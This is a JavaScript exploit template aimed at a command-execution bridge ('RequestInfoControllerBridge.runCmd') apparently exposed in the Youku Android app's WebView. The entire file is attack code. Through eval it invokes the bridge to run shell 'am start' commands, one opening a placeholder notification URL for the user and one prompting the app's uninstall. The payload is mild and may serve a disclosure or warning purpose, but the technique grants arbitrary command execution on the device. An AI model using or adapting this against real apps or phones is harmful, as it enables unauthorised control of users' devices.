template = function(){
    var urlToNotifyUser = "<notification_to_users>";
    var shouldNotifyUser = true;
    var shouldUninstall = true;

    var packageName = "com.youku.phone";

    var jsiObjectName = "RequestInfoControllerBridge";
    var jsiExecApiName = "runCmd";

    if(shouldNotifyUser){ 
    var cmdNotifyUser = "am start -a android.intent.action.VIEW -d " + urlToNotifyUser;
    eval(jsiObjectName + '.' + jsiExecApiName)(cmdNotifyUser)
    }

    if(shouldUninstall){ 
    var cmdDelete = "am start -a android.intent.action.DELETE -d package:" + packageName;
    eval(jsiObjectName + '.' + jsiExecApiName)(cmdDelete)
    }
    }()